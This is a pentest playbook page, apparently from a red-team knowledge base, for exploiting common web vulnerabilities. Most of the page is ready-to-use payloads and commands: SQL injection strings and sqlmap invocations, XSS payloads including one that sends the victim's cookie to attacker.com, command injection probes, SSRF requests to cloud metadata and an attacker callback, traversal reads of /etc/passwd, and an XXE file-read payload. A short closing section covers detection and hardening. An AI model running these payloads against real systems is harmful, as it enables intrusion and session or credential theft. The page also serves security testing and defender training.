---
title: Common Web Vulnerabilities
phase: explotacion
platform: web
tags: [web, sqli, xss, lfi, rfi, upload]
risk: high
attack_tactic: TA0002
attack_technique: T1059
data_sources: [web-server-logs, waf-logs, ids-ips]
last_review: 2026-05-25
---

# Common Web Vulnerabilities

### Objetivo

Identificar y explotar vulnerabilidades web comunes para obtener acceso inicial o escalar privilegios.

### SQL Injection

```bash
# Detect with '
' OR '1'='1

# Union based
' UNION SELECT null,@@version--

# Time based blind
'; WAITFOR DELAY '00:00:05'--

# SQLMap
sqlmap -u "http://target.com/?id=1" --batch --risk=3
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
```

### Cross-Site Scripting (XSS)

```bash
# Reflected
<script>alert(document.domain)</script>

# Stored
<img src=x onerror=alert(1)>

# DOM-based
javascript:alert(document.domain)

# XSS payloads cheatsheet
<script>fetch('http://attacker.com?c='+btoa(document.cookie))</script>

# XSSer
python xsser.py -u "http://target.com/search?q=test"
```

### Command Injection

```bash
# detection
; whoami
| whoami
`whoami`
$(whoami)

# blind
; sleep 5
&& sleep 5
```

### SSRF

```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://internal-server/admin

# callback
http://attacker.com/?url=http://target.com/internal/api
```

### One-liners

```bash
# Directory traversal
curl "http://target.com/?file=../../../../../../../etc/passwd"

# Open redirect
curl -I "http://target.com/redirect?url=http://evil.com"

# XXE
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

### Detección y Mitigación

- **Visibilidad:** WAF alerts, 500 errors pattern, SQL errors in logs, XSS payloads in logs.
- **Hardening:** Input validation, parameterized queries, WAF, Content Security Policy, output encoding.

### Validación de Cobertura

- **Prueba técnica:** Run sqlmap/XSSer in lab.
- **Criterio de éxito:** WAF blocks or SIEM alerts on SQL injection attempts.
